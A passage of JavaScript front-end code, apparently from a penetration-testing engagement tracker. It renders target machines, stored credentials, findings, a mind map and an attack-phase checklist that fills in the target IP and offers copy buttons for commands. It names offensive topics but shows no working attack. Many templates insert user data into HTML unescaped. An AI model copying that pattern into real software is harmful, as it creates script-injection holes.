function machineEvidenceCount(machineId) {
  const findingEvidence = machineFindings(machineId).reduce((sum, f) => sum + (f.evidence || []).length, 0);
  const machine = machineById(machineId);
  const itemEvidence = machine ? Object.values(machine.item_evidence || {}).reduce((sum, arr) => sum + arr.length, 0) : 0;
  return findingEvidence + itemEvidence;
}

function setNav() {
  const path = routePath();
  document.querySelectorAll('.nav-item').forEach((item) => {
    const target = item.dataset.route;
    const active = path === target || (target !== '/' && path.startsWith(target));
    item.classList.toggle('active', active);
  });
}

function renderDashboard() {
  const cards = state.machines.map((machine, index) => {
    const status = statusConfig[machine.status] || statusConfig.pending;
    const progress = getTotalProgress(machine);
    return `
      <article class="card machine-card animate-fade-in stagger-${Math.min(index + 1, 6)}" data-machine-id="${machine.id}">
        <div class="card-top">
          <span class="status"><span class="status-dot ${status.colorClass}"></span>${status.label}</span>
          <div class="actions">
            <span class="badge">${machine.os_type === 'windows' ? 'WIN' : 'LNX'}</span>
            <button class="icon-btn" data-delete-machine="${machine.id}" title="Delete">🗑</button>
          </div>
        </div>
        <div style="margin-top:.8rem">
          <div class="mono">${machine.ip}</div>
          ${machine.hostname ? `<div class="small mono" style="margin-top:.3rem">${machine.hostname}</div>` : ''}
        </div>
        ${machine.tags?.length ? `<div class="tags">${machine.tags.map((tag) => `<span class="badge">${tag}</span>`).join('')}</div>` : ''}
        <div class="progress">
          <div class="progress-row"><span class="dim">Progress</span><span style="color:var(--green)" class="mono">${progress}%</span></div>
          <div class="progress-bar"><div class="progress-fill" style="width:${progress}%"></div></div>
        </div>
        <div class="small mono dim" style="margin-top:.7rem">${formatShort(machine.created_at)}</div>
      </article>
    `;
  }).join('');

  return `
    <section>
      <div class="header-row">
        <div>
          <h1>Target Machines</h1>
          <div class="sub">${state.machines.length} machine${state.machines.length !== 1 ? 's' : ''} tracked</div>
          <div class="small dim" id="appStorageMeter">App Data: estimating...</div>
          <div class="small dim" id="browserStorageMeter">Browser Quota: estimating...</div>
        </div>
        <div class="actions">
          <button class="btn btn-ghost" id="resetMachinesBtn">Reset Machines</button>
          <button class="btn btn-primary" id="openMachineModal">Add Machine</button>
        </div>
      </div>
      ${state.machines.length ? `<div class="grid">${cards}</div>` : `<div class="empty"><h3>No targets yet</h3><div class="small">Add your first machine to start tracking</div></div>`}
    </section>
  `;
}

function renderTools() {
  return `
    <section>
      <div class="header-row">
        <div>
          <h1>🧰 Tools</h1>
          <div class="sub">Documentation hub for tools, how-tos, and wiki notes</div>
        </div>
      </div>
      <div class="grid">
        <article class="card">
          <h3 class="subhead" style="margin-bottom:.55rem">Recon</h3>
          <div class="small">Nmap workflows, service enumeration cheat-sheets, and quick command playbooks.</div>
        </article>
        <article class="card">
          <h3 class="subhead" style="margin-bottom:.55rem">Web</h3>
          <div class="small">Burp workflows, content discovery notes, and SQLi/LFI/RFI testing references.</div>
        </article>
        <article class="card">
          <h3 class="subhead" style="margin-bottom:.55rem">AD / Internal</h3>
          <div class="small">BloodHound, Kerberos attacks, WinRM/SMB lateral movement, and AD post-exploitation notes.</div>
        </article>
        <article class="card">
          <h3 class="subhead" style="margin-bottom:.55rem">Privilege Escalation</h3>
          <div class="small">Linux and Windows privilege escalation checklists and GTFOBins/LOLBAS references.</div>
        </article>
      </div>
      <div class="card" style="margin-top:.9rem">
        <h3 class="subhead" style="margin-bottom:.55rem">Usage</h3>
        <div class="small">Use this page as a centralized wiki for your tooling notes, procedures, and engagement runbooks.</div>
      </div>
    </section>
  `;
}

function renderCredentialRows(filter = '') {
  const q = filter.trim().toLowerCase();
  const rows = state.credentials.filter((credential) => {
    if (!q) return true;
    const machine = machineById(credential.machine_id);
    return credential.username.toLowerCase().includes(q)
      || credential.service.toLowerCase().includes(q)
      || machine?.ip.toLowerCase().includes(q);
  });

  const html = rows.map((credential) => {
    const machine = machineById(credential.machine_id);
    const shown = state.reveal[credential.id];
    return `
      <tr>
        <td class="mono" style="color:var(--green)">${machine?.ip || 'Unknown'}</td>
        <td class="mono">${credential.username}</td>
        <td class="mono" style="color:var(--muted)">${shown ? credential.password : '••••••••'}</td>
        <td><span class="badge">${credential.cred_type}</span></td>
        <td>${credential.service || '-'}</td>
        <td class="small mono dim">${formatShort(credential.created_at)}</td>
        <td>
          <div class="actions">
            <button class="icon-btn" data-action="reveal" data-id="${credential.id}">${shown ? '🙈' : '👁'}</button>
            <button class="icon-btn" data-action="copy" data-id="${credential.id}">⧉</button>
            <button class="icon-btn" data-action="delete" data-id="${credential.id}">🗑</button>
          </div>
        </td>
      </tr>
    `;
  }).join('');

  document.getElementById('credTable').innerHTML = html || '<tr><td colspan="7" class="empty">No credentials stored yet</td></tr>';
}

function renderMindMap() {
  const tree = state.ui.mindmapMode === 'tree';
  return `
    <section style="height:100%">
      <div class="header-row">
        <div>
          <h1>◎ Mind Map</h1>
          <div class="sub">Visualize your engagement findings</div>
        </div>
        <div class="view-switch">
          <button class="${tree ? 'active' : ''}" data-mode="tree">Tree</button>
          <button class="${!tree ? 'active' : ''}" data-mode="hierarchy">Hierarchy</button>
        </div>
      </div>
      <div class="canvas" id="mindmapCanvas"></div>
    </section>
  `;
}

function renderMindMapBody() {
  const host = document.getElementById('mindmapCanvas');
  if (!host) return;

  if (!state.machines.length) {
    host.innerHTML = '<div class="empty">Add machines and findings to see the mind map</div>';
    return;
  }

  if (state.ui.mindmapMode === 'tree') {
    host.innerHTML = `
      <div class="node-root">Security Tracker</div>
      <div class="tree-grid">
        ${state.machines.map((machine) => {
          const findings = machineFindings(machine.id);
          const credentials = machineCredentials(machine.id);
          return `
            <div class="node">
              <div class="mono" style="font-size:.8rem">${machine.ip}</div>
              <div class="small">${machine.os_type.toUpperCase()} · ${(statusConfig[machine.status]?.label || machine.status).toUpperCase()}</div>
              ${findings.map((finding) => `<div style="margin-top:.45rem;font-size:.75rem;color:${finding.severity === 'critical' || finding.severity === 'high' ? '#f97316' : '#f59e0b'}">• ${finding.title}</div>`).join('')}
              ${credentials.map((credential) => `<div style="margin-top:.3rem;font-size:.75rem;color:var(--amber)">• ${credential.username} (${credential.service || credential.cred_type})</div>`).join('')}
            </div>
          `;
        }).join('')}
      </div>
    `;
    return;
  }

  host.innerHTML = state.machines.map((machine) => {
    const findings = machineFindings(machine.id);
    const credentials = machineCredentials(machine.id);
    return `
      <div class="accordion-item">
        <button class="accordion-head" data-acc="${machine.id}">
          <span class="status-dot ${statusConfig[machine.status]?.colorClass || 'status-pending'}"></span>
          <span class="mono" style="font-size:.8rem">${machine.ip}</span>
          <span class="badge">${machine.os_type.toUpperCase()}</span>
          <span class="small" style="text-transform:uppercase">${statusConfig[machine.status]?.label || machine.status}</span>
        </button>
        <div class="accordion-body" id="acc-${machine.id}" style="display:none">
          ${findings.length ? `<div style="margin-bottom:.7rem"><div class="small" style="margin-bottom:.3rem">Findings (${findings.length})</div>${findings.map((finding) => `<div class="small">• ${finding.title} [${finding.severity}]</div>`).join('')}</div>` : ''}
          ${credentials.length ? `<div><div class="small" style="margin-bottom:.3rem">Credentials (${credentials.length})</div>${credentials.map((credential) => `<div class="small mono">• ${credential.username} (${credential.service || credential.cred_type})</div>`).join('')}</div>` : ''}
          ${!findings.length && !credentials.length ? '<div class="small dim">No findings or credentials yet</div>' : ''}
        </div>
      </div>
    `;
  }).join('');

  host.querySelectorAll('.accordion-head').forEach((button) => {
    button.addEventListener('click', () => {
      const pane = document.getElementById(`acc-${button.dataset.acc}`);
      pane.style.display = pane.style.display === 'none' ? 'block' : 'none';
    });
  });
}

function renderTimeline() {
  const grouped = state.activities.reduce((acc, activity) => {
    const day = new Date(activity.timestamp).toDateString();
    if (!acc[day]) acc[day] = [];
    acc[day].push(activity);
    return acc;
  }, {});

  return `
    <section>
      <div class="header-row">
        <div>
          <h1>◷ Activity Timeline</h1>
          <div class="sub">${state.activities.length} event${state.activities.length !== 1 ? 's' : ''} logged</div>
        </div>
      </div>
      <div class="timeline-scroll">
        ${Object.entries(grouped).map(([day, entries]) => `
          <div class="date-head">
            <span class="badge mono">${new Date(day).toLocaleDateString(undefined, { weekday: 'long', month: 'long', day: 'numeric', year: 'numeric' })}</span>
            <div class="hr"></div>
            <span class="small dim">${entries.length} events</span>
          </div>
          <div class="group">
            ${entries.map((entry) => {
              const machine = machineById(entry.machine_id);
              return `
                <div class="event ${entry.action}">
                  <div style="display:flex;gap:.45rem;align-items:center;flex-wrap:wrap"><span class="badge mono">${formatActionLabel(entry.action)}</span><span>${entry.details}</span></div>
                  <div class="small" style="margin-top:.2rem">${formatTime(entry.timestamp)} · ${relative(entry.timestamp)}${machine ? ` · <span class="mono" style="color:var(--green)">${machine.ip}</span>` : ''}</div>
                </div>
              `;
            }).join('')}
          </div>
        `).join('')}
      </div>
    </section>
  `;
}

function substituteTargetIp(cmd, ip) {
  return cmd.replace(/<TARGET_IP>|<target-ip>|<TARGET-IP>|<Target-IP>|<Target-ip>/gi, ip);
}

function checklistPhasesFor(machine) {
  const activePhases = checklistPhases.filter((phase) => {
    return true;
  });

  return activePhases
    .map((phase) => ({
      ...phase,
      items: phase.items.filter((item) => isItemApplicableForMachine(machine, phase.id, item)),
    }))
    .filter((phase) => phase.items.length > 0);
}

const PHASE_EMOJI = {
  osint:            '🔍',
  recon:            '📡',
  exploitation:     '💥',
  post_exploitation:'🦾',
  persistence:      '🔒',
};

function renderChecklist(machine) {
  const completedItems = machine.completed_items || [];
  const allPhases = checklistPhasesFor(machine);
  const reconPorts = getReconPortOptions();
  const selectedPorts = machine.selected_ports || [];
  const totalItems = getApplicableItems(machine).length;
  const taskFilter = state.ui.checklistTaskFilter || 'all';
  const phases = allPhases
    .map((phase) => ({
      ...phase,
      items: phase.items.filter((item) => {
        const done = completedItems.includes(item.id);
        if (taskFilter === 'completed') return done;
        if (taskFilter === 'incomplete') return !done;
        return true;
      }),
    }))
    .filter((phase) => phase.items.length > 0);

  return `
    <div class="mt-4">
      <div class="checklist-head">
        <div class="checklist-head-left">
          <button class="btn btn-ghost checklist-btn-reset" id="resetChecklistBtn">Reset Checklist</button>
          <button class="btn btn-ghost checklist-btn-incomplete${taskFilter === 'incomplete' ? ' active' : ''}" id="showIncompleteTasksBtn" aria-pressed="${taskFilter === 'incomplete' ? 'true' : 'false'}">Show Incomplete Tasks</button>
          <button class="btn btn-ghost checklist-btn-completed${taskFilter === 'completed' ? ' active' : ''}" id="showCompletedTasksBtn" aria-pressed="${taskFilter === 'completed' ? 'true' : 'false'}">Show Completed Tasks</button>
        </div>
        <div class="checklist-head-right">
          <span class="badge" style="border-color:rgba(16,185,129,.4);color:var(--green)">${completedItems.length} / ${totalItems} completed</span>
        </div>
      </div>
      <div class="port-filter-wrap">
        <div class="port-filter-header">
          <span class="port-filter-icon">&#x1F6AA;</span>
          <span class="port-filter-label">RECON PORTS</span>
          <span class="port-filter-line"></span>
        </div>
        <div class="port-filter-card">
          <div class="port-filter-list">
            <button class="port-chip ${selectedPorts.length ? '' : 'active'}" data-port-filter="__all__" type="button">All</button>
            ${reconPorts.map((port) => `
              <button class="port-chip ${selectedPorts.includes(port) ? 'active' : ''}" data-port-filter="${port}" type="button">${port}</button>
            `).join('')}
          </div>
        </div>
      </div>
      <div class="checklist-list">
        ${phases.map((phase) => {
          const expanded = state.ui.openPhases.includes(phase.id);
          const completed = phase.items.filter((item) => completedItems.includes(item.id)).length;
          const progress = getPhaseProgress(phase, completedItems);
          return `
            <div class="accordion-item phase-${phase.id}" id="phase-${machine.id}-${phase.id}">
              <button class="accordion-head" data-phase-toggle="${phase.id}">
                <span class="phase-title">
                  <span class="phase-icon">${PHASE_EMOJI[phase.id] || '🔧'}</span>
                  <span class="phase-name">${phase.name}</span>
                  ${phase.optional ? '<span class="badge">Optional</span>' : ''}
                </span>
                <div class="phase-progress">
                  <span class="small mono">${completed}/${phase.items.length}</span>
                  <div class="progress-bar" style="width:110px"><div class="progress-fill" style="width:${progress}%"></div></div>
                </div>
              </button>
              <div class="accordion-body" style="display:${expanded ? 'block' : 'none'}">
                ${phase.items.map((item) => {
                  const done = completedItems.includes(item.id);
                  const evidence = machine.item_evidence?.[item.id] || [];
                  return `
                    <div class="check-item" id="task-${machine.id}-${item.id}">
                      <div class="check-line">
                        <input type="checkbox" data-check-item="${item.id}" ${done ? 'checked' : ''}>
                        <span class="${done ? 'line' : ''}" style="user-select:text;cursor:default;">${item.name}</span>
                      </div>
                      ${item.commands ? item.commands.map((c, ci) => `
                        <div class="cmd-sub-desc">${c.desc}</div>
                        ${c.subdesc ? `<div class="cmd-sub-desc" style="font-size:.78rem;color:var(--muted);margin-top:.15rem;font-style:italic">${c.subdesc}</div>` : ''}
                        <div class="cmd-block mt-2">
                          <pre>${substituteTargetIp(c.cmd, machine.ip).replace(/</g, '&lt;')}</pre>
                          <button class="cmd-copy" data-copy-raw-idx="${item.id}__${ci}">Copy</button>
                        </div>
                      `).join('') : item.command ? `
                        <div class="cmd-block mt-2 text-xs">
                          <pre>${substituteTargetIp(item.command, machine.ip).replace(/</g, '&lt;')}</pre>
                          <button class="cmd-copy" data-copy-cmd="${item.id}">Copy</button>
                        </div>
                      ` : ''}
                      <div class="evidence-block">
                        <div class="small dim">Evidence</div>
                        <input type="file" accept="image/*" multiple data-evidence-upload="${item.id}" style="display:none">
                        <div class="evidence-dropzone" data-evidence-drop="${item.id}" tabindex="0">Drop screenshots here or click and press Ctrl+V to paste</div>
                        ${evidence.length ? `
                          <div class="evidence-list">
                            ${evidence.map((file) => `
                              <div class="evidence-row">
                                <button class="btn btn-ghost evidence-open" data-open-evidence="${file.id}" type="button">${file.name}</button>
                                <div class="evidence-actions">
                                  <button class="icon-btn" data-rename-evidence="${file.id}" data-item-id="${item.id}" type="button" title="Rename">Rename</button>
                                  <button class="icon-btn" data-delete-evidence="${file.id}" data-item-id="${item.id}" type="button" title="Delete">Delete</button>
                                </div>
                              </div>
                            `).join('')}
                          </div>
                        ` : ''}
                      </div>
                    </div>
                  `;
                }).join('')}
              </div>
            </div>
          `;
        }).join('')}
      </div>
    </div>
  `;
}

function renderMachineCredentialsTab(machine) {
  const credentials = machineCredentials(machine.id);

  return `
    <div class="mt-4">
      <div class="header-row" style="margin-bottom:.6rem">
        <h3 class="subhead">Machine Credentials</h3>
        <button class="btn btn-primary" id="openMachineCredForm">Add</button>
      </div>
      ${state.ui.showAddMachineCred ? `
        <div class="inline-form card">
          <div class="split">
            <label>Username *<input id="mcUsername"></label>
            <label>Service<input id="mcService" placeholder="SSH"></label>
          </div>
          <label>Password / Hash<input id="mcPassword"></label>
          <label>Type
            <select id="mcType">
              <option value="plain">Plain Text</option>
              <option value="hash">Hash</option>
              <option value="key">SSH Key</option>
              <option value="token">Token</option>
            </select>
          </label>
          <div class="modal-actions">
            <button class="btn btn-ghost" id="cancelMachineCredForm">Cancel</button>
            <button class="btn btn-primary" id="submitMachineCredForm">Add Credential</button>
          </div>
        </div>
      ` : ''}
      ${!credentials.length ? '<p class="small dim" style="padding:1rem;text-align:center">No credentials found yet</p>' : `
        <div class="table-wrap">
          <table>
            <thead>
              <tr><th>Username</th><th>Password/Hash</th><th>Type</th><th>Service</th><th>Time</th><th>Actions</th></tr>
            </thead>
            <tbody>
              ${credentials.map((credential) => {
                const shown = state.reveal[credential.id];
                return `
                  <tr>
                    <td class="mono">${credential.username}</td>
                    <td class="mono" style="color:var(--muted)">${shown ? credential.password : '••••••••'}</td>
                    <td><span class="badge">${credential.cred_type}</span></td>
                    <td>${credential.service || '-'}</td>
                    <td class="small mono dim">${formatTime(credential.created_at)}</td>
                    <td>
                      <div class="actions">
                        <button class="icon-btn" data-machine-cred-action="reveal" data-id="${credential.id}" title="${shown ? 'Hide' : 'Reveal'}">${shown ? '🙈' : '👁'}</button>
                        <button class="icon-btn" data-machine-cred-action="copy" data-id="${credential.id}" title="Copy">⧉</button>
                        <button class="icon-btn" data-machine-cred-action="edit" data-id="${credential.id}" title="Edit">✎</button>
                        <button class="icon-btn" data-machine-cred-action="delete" data-id="${credential.id}" title="Delete">🗑</button>
                      </div>
                    </td>
                  </tr>
                `;
              }).join('')}
            </tbody>
          </table>
        </div>
      `}
    </div>
  `;
}

function buildFindingCards(allFindings, parentId, depth) {
  const children = allFindings.filter(f => (f.parent_id || null) === (parentId || null));
  return children.map(finding => {
    const parentFinding = depth === 0 ? null : allFindings.find(f => f.id === finding.parent_id);
    const isChild = depth > 0;
    return `
      <div class="finding-card${isChild ? ' finding-child' : ''}">
        <div class="finding-main">
          ${isChild && parentFinding ? `<div class="finding-parent-label">↳ child of <em>${parentFinding.title}</em></div>` : ''}
          <div class="finding-head">
            <span class="sev-badge ${severityClass[finding.severity] || 'severity-info'}">${finding.severity.toUpperCase()}</span>
            <span>${finding.title}</span>
            <span class="badge">${finding.phase}</span>
          </div>
          ${finding.description ? `<p class="small" style="margin-top:.35rem">${finding.description}</p>` : ''}
          ${(finding.evidence || []).length ? `
            <div class="evidence-list" style="margin-top:.35rem">
              ${(finding.evidence || []).map((file) => `
                <div class="evidence-row">
                  <button class="btn btn-ghost evidence-open" data-open-finding-evidence="${file.id}" type="button">${file.name}</button>
                  <button class="icon-btn" data-rename-finding-evidence="${file.id}" data-finding-id="${finding.id}" title="Rename">✎</button>
                  <button class="icon-btn" data-delete-finding-evidence="${file.id}" data-finding-id="${finding.id}" title="Delete">🗑</button>
                </div>
              `).join('')}
            </div>
          ` : ''}
          <p class="small mono dim" style="margin-top:.35rem">${formatDate(finding.created_at)}</p>
        </div>
        <div class="finding-actions">
          <button class="icon-btn" data-edit-finding="${finding.id}" title="Edit">✎</button>
          <button class="icon-btn" data-delete-finding="${finding.id}" title="Delete">🗑</button>
        </div>
      </div>
      ${buildFindingCards(allFindings, finding.id, depth + 1)}
    `;
  }).join('');
}

function renderFindingsTab(machine) {
  const findings = machineFindings(machine.id);

  return `
    <div class="mt-4">
      <div class="header-row" style="margin-bottom:.6rem">
        <h3 class="subhead">Findings</h3>
        <button class="btn btn-primary" id="openFindingForm">Add</button>
      </div>
      ${state.ui.showAddFinding ? `
        <div class="inline-form card">
          <label>Title *<input id="findingTitle" placeholder="Apache 2.4.49 Path Traversal"></label>
          <label>Description<textarea id="findingDescription" rows="3" style="width:100%;margin-top:.4rem;background:var(--bg);border:1px solid var(--line);color:var(--text);border-radius:.45rem;padding:.55rem .6rem"></textarea></label>
          <div class="split">
            <label>Severity
              <select id="findingSeverity">
                <option value="critical">Critical</option>
                <option value="high" selected>High</option>
                <option value="medium">Medium</option>
                <option value="low">Low</option>
                <option value="info">Info</option>
              </select>
            </label>
            <label>Phase
              <select id="findingPhase">${checklistPhases.map((phase) => `<option value="${phase.id}">${phase.name}</option>`).join('')}</select>
            </label>
          </div>
          <label>Parent Finding
            <select id="findingParentId">
              <option value="">Root Level (no parent)</option>
              ${(() => {
                const firstPhase = checklistPhases[0]?.id || '';
                const ep = buildEligibleParents(machine.id, firstPhase, new Set());
                let opts = ep.samePhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('');
                if (ep.crossPhase.length) {
                  opts += `<optgroup label="Cross-phase (${ep.prevPhaseId})">` +
                    ep.crossPhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('') +
                    '</optgroup>';
                }
                return opts;
              })()}
            </select>
          </label>
          <input id="findingEvidence" type="file" accept="image/*" multiple style="display:none">
          <div class="evidence-dropzone" id="findingEvidenceDrop" tabindex="0">Drop screenshots here or click and press Ctrl+V to paste</div>
          <div class="evidence-list" id="findingEvidenceList"></div>
          <div class="modal-actions">
            <button class="btn btn-ghost" id="cancelFindingForm">Cancel</button>
            <button class="btn btn-primary" id="submitFindingForm">Add Finding</button>
          </div>
        </div>
      ` : ''}
      ${!findings.length ? '<p class="small dim" style="padding:1rem;text-align:center">No findings documented yet</p>' : `
        <div class="finding-list">
          ${buildFindingCards(findings, null, 0)}
        </div>
      `}
    </div>
  `;
}

function renderNotesTab(machine) {
  return `
    <div class="mt-4">
      <h3 class="subhead">Machine Notes</h3>
      <textarea id="machineNotes" rows="12" style="width:100%;margin-top:.5rem;background:var(--bg);border:1px solid var(--line);color:var(--text);border-radius:.45rem;padding:.55rem .6rem" placeholder="Write your notes here...">${(machine.notes || '').replace(/</g, '&lt;')}</textarea>
      <p class="small dim" style="margin-top:.4rem">Notes are auto-saved when you click away.</p>
    </div>
  `;
}

function renderCredInlinePanel(machine) {
  const creds = machineCredentials(machine.id);
  const MAX_VISIBLE = 6;
  const overflow = creds.length > MAX_VISIBLE;
  return `
    <div class="mm-cred-panel mm-cred-panel--inline">
      <div class="mm-cred-panel-header">
        <span class="mm-cred-panel-icon">🔑</span>
        <span class="mm-cred-panel-label">CREDENTIALS</span>
        <span class="mm-cred-panel-count">${creds.length}</span>
        <button class="btn btn-ghost mm-cred-expand-btn" id="credPanelMaximize" title="View all credentials">⤢</button>
      </div>
      <div class="mm-cred-panel-body">
        ${!creds.length ? '<div class="mm-cred-empty">No credentials documented yet</div>' : creds.slice(0, MAX_VISIBLE).map(c => `
          <div class="mm-cred-row" data-mm-cred-edit="${c.id}" title="Click to edit">
            <div class="mm-cred-row-main">
              <span class="mm-cred-username">${c.username}</span>
              <span class="mm-cred-badge">${c.service || c.cred_type}</span>
            </div>
            <div class="mm-cred-row-pw">
              <span class="mm-cred-pw-val">${state.reveal[c.id] ? (c.password || '—') : '••••••'}</span>
              <button class="mm-cred-reveal-btn" data-mm-reveal-cred="${c.id}" title="${state.reveal[c.id] ? 'Hide' : 'Show'}">${state.reveal[c.id] ? '🙈' : '👁'}</button>
            </div>
          </div>
        `).join('')}
        ${overflow ? `<button class="btn btn-ghost mm-cred-overflow-btn" id="credPanelMaximize2">••• +${creds.length - MAX_VISIBLE} more — view all</button>` : ''}
      </div>
    </div>
  `;
}

function renderMachineMindMap(machine) {
  const allFindings = machineFindings(machine.id);
  const allCreds    = machineCredentials(machine.id);
  const isFullscreenView = mmFsMachineId === machine.id;
  const activePhase = state.ui.mmPhase || 'all';
  const isPreviewMode = !isFullscreenView;

  const PHASE_DEFS = [
    { id: 'all',              label: 'Default',         col: '#94a3b8' },
    { id: 'osint',            label: 'OSINT',           col: '#a78bfa' },
    { id: 'recon',            label: 'Enumeration',     col: '#22d3ee' },
    { id: 'exploitation',     label: 'Exploitation',    col: '#f97316' },
    { id: 'post_exploitation',label: 'Post-Exploit',    col: '#f43f5e' },
    { id: 'persistence',      label: 'Persistence',     col: '#3b82f6' },
  ];

  /* ── Phase order for cross-phase parenting ── */
  const PHASE_ORDER = ['osint', 'recon', 'exploitation', 'post_exploitation', 'persistence'];

  const vpId     = 'mm-vp-'     + machine.id;
  const canvasId = 'mm-canvas-' + machine.id;

  const filterBar = `
    <div class="mm-phase-bar">
      <div class="mm-phase-tabs">
        ${PHASE_DEFS.map(f => `
          <button
            class="mm-phase-btn${activePhase === f.id ? ' mm-phase-btn--active' : ''}${f.id === 'all' ? ' mm-phase-btn--all' : ''}"
            data-mm-phase="${f.id}"
            ${f.col ? `style="--pcol:${f.col}"` : ''}
          >${f.label}</button>
        `).join('')}
      </div>
      <div class="mm-phase-actions">
        <button class="mm-zoom-btn" id="mm-zoom-reset-${machine.id}" title="Restart View">Restart View &#x21BA;</button>
        <button class="mm-zoom-btn mm-fs-btn" id="mm-fs-${machine.id}" title="Full-Screen">Full-Screen &#x26F6;</button>
      </div>
    </div>
  `;

  if (!allFindings.length) {
    const unlinkedCredsEmpty = allCreds.filter(c => !c.finding_id);
    const unlinkedHtml = !unlinkedCredsEmpty.length ? '' : `
      <div class="mm-unlinked-creds">
        <div class="mm-unlinked-creds-header">
          <span class="mm-unlinked-icon">\uD83D\uDD11</span>
          Unlinked Credentials
          <span class="badge" style="border-color:rgba(234,179,8,.35);color:#eab308;font-size:.6rem">${unlinkedCredsEmpty.length}</span>
        </div>
        <div class="mm-unlinked-creds-list">
          ${unlinkedCredsEmpty.map(c => `
            <div class="mm-cred-blob" style="position:relative">
              <span class="mm-cred-blob-icon">\uD83D\uDD11</span>
              <span class="mm-cred-blob-name">${c.username}</span>
              ${c.service ? `<span class="mm-cred-blob-svc">${c.service}</span>` : `<span class="mm-cred-blob-svc">${c.cred_type}</span>`}
            </div>
          `).join('')}
        </div>
      </div>
    `;
    return `
      <div class="machine-mindmap" id="mm-container-${machine.id}">
        ${filterBar}
        <div class="mm-viewport" id="${vpId}">
          <div class="mm-pan-canvas" id="${canvasId}">
            <p class="small dim" style="padding:.75rem">Add findings to populate the mind map.</p>
            ${unlinkedHtml}
          </div>
        </div>
      </div>
    `;
  }

  const sevColor = (sev) => {
    if (sev === 'critical') return '#ef4444';
    if (sev === 'high')     return '#f97316';
    if (sev === 'medium')   return '#f59e0b';
    if (sev === 'low')      return '#3b82f6';
    return 'var(--muted)';
  };

  function fmtTime(stamp) {
    if (!stamp) return '';
    const d = new Date(stamp);
    if (isNaN(d)) return '';
    const dd = String(d.getDate()).padStart(2, '0');
    const mm = String(d.getMonth() + 1).padStart(2, '0');
    const yy = String(d.getFullYear()).slice(-2);
    const hh = String(d.getHours()).padStart(2, '0');
    const mi = String(d.getMinutes()).padStart(2, '0');
    const ss = String(d.getSeconds()).padStart(2, '0');
    return `[${hh}:${mi}:${ss}] [${dd}/${mm}/${yy}]`;
  }

  function renderLeafGroup(f) {
    // Only show same-phase children (cross-phase children are roots in their own lane)
    const children    = allFindings.filter(c => c.parent_id === f.id && c.phase === f.phase);
    const sColor      = sevColor(f.severity);
    const linkedCreds = allCreds.filter(c => c.finding_id === f.id);
    const evidenceCount = (f.evidence || []).length;
    return `
      <div class="mm-leaf-row" data-mm-fid="${f.id}">
        <div class="mm-node mm-leaf-clickable" data-finding-view="${f.id}" style="--node-sev:${sColor}">
          <span class="mm-node-title">${f.title}</span>
          <div class="mm-node-meta">
            <span class="mm-node-badge" style="background:${sColor}22;color:${sColor};border-color:${sColor}55">${f.severity}</span>
            ${evidenceCount ? `<span class="mm-evidence-badge" title="${evidenceCount} evidence file${evidenceCount > 1 ? 's' : ''}">📓 ${evidenceCount}</span>` : ''}
            ${linkedCreds.length ? `<span class="mm-evidence-badge" title="${linkedCreds.length} linked credential${linkedCreds.length > 1 ? 's' : ''}" style="color:#eab308">🔑 ${linkedCreds.length}</span>` : ''}
          </div>
          <span class="mm-time">${fmtTime(f.created_at)}</span>
        </div>
        ${linkedCreds.length ? `
          <div class="mm-cred-chain">
            ${linkedCreds.map(c => `
              <div class="mm-cred-blob">
                <span class="mm-cred-blob-icon">\uD83D\uDD11</span>
                <span class="mm-cred-blob-name">${c.username}</span>
                ${c.service ? `<span class="mm-cred-blob-svc">${c.service}</span>` : ''}
              </div>
            `).join('')}
          </div>
        ` : ''}
        ${children.length ? `
          <div class="mm-leaves">
            ${children.map(child => renderLeafGroup(child)).join('')}
          </div>
        ` : ''}
      </div>
    `;
  }

  function renderUnlinkedCreds() {
    const unlinked = allCreds.filter(c => !c.finding_id);
    if (!unlinked.length) return '';
    return `
      <div class="mm-unlinked-creds">
        <div class="mm-unlinked-creds-header">
          <span class="mm-unlinked-icon">\uD83D\uDD11</span>
          Unlinked Credentials
          <span class="badge" style="border-color:rgba(234,179,8,.35);color:#eab308;font-size:.6rem">${unlinked.length}</span>
        </div>
        <div class="mm-unlinked-creds-list">
          ${unlinked.map(c => `
            <div class="mm-cred-blob" style="position:relative">
              <span class="mm-cred-blob-icon">\uD83D\uDD11</span>
              <span class="mm-cred-blob-name">${c.username}</span>
              ${c.service ? `<span class="mm-cred-blob-svc">${c.service}</span>` : `<span class="mm-cred-blob-svc">${c.cred_type}</span>`}
            </div>
          `).join('')}
        </div>
      </div>
    `;
  }

  /* Group root-level findings by phase.
     A finding is root in its own phase if:
       - it has no parent_id, OR
       - its parent doesn't exist, OR
       - its parent is in a DIFFERENT phase (cross-phase parent) */
  const phaseOrder = checklistPhases.map(p => p.id);
  const byPhase = {};
  allFindings.forEach(f => {
    const parent = f.parent_id ? allFindings.find(p => p.id === f.parent_id) : null;
    const isRoot = !f.parent_id || !parent || parent.phase !== f.phase;
    if (!isRoot) return;
    const pid = f.phase || 'unknown';
    if (!byPhase[pid]) byPhase[pid] = [];
    byPhase[pid].push(f);
  });

  const fixedIds = ['osint','recon','exploitation','post_exploitation','persistence'];
  /* Include any findings with unexpected/legacy phases */
  Object.keys(byPhase).forEach(pid => {
    if (!fixedIds.includes(pid)) fixedIds.push(pid);
  });

  const phaseName = (id) => {
    // use short label from PHASE_DEFS if available
    const def = PHASE_DEFS.find(d => d.id === id);
    if (def && def.label !== 'Default') return def.label;
    const p = checklistPhases.find(ph => ph.id === id);
    return p ? p.name : id;
  };

  let canvasContent;
  if (activePhase === 'all') {
    /* ── Default + Fullscreen: draggable free-form blocks, left-to-right ── */
    const fsPhaseIds = ['osint', 'recon', 'exploitation', 'post_exploitation', 'persistence'];
    /* Include any findings with unexpected/legacy phases */
    Object.keys(byPhase).forEach(pid => {
      if (!fsPhaseIds.includes(pid)) fsPhaseIds.push(pid);
    });
    const fsBlocks = fsPhaseIds.map((pid, i) => {
      const col  = phaseColor(pid);
      const name = phaseName(pid);
      const items = byPhase[pid] || [];
      return `
        <div class="mm-fs-block" data-mm-drag-block="${pid}"
             style="--phase-col:${col}; left:${i * 400}px; top:${40 + (i % 2) * 30}px">
          <div class="mm-fs-block-header" data-mm-drag-handle>
            <span class="mm-phase-lane-dot" style="background:${col};box-shadow:0 0 7px ${col}99"></span>
            <span class="mm-fs-block-name">${name}</span>
            <span class="mm-phase-lane-count">${items.length}</span>
          </div>
          <div class="mm-fs-block-body">
            ${!items.length ? '<span class="mm-empty-hint">no findings</span>' :
              items.map(f => renderLeafGroup(f)).join('')}
          </div>
        </div>`;
    });

    canvasContent = `
      <div class="mm-fs-workspace">
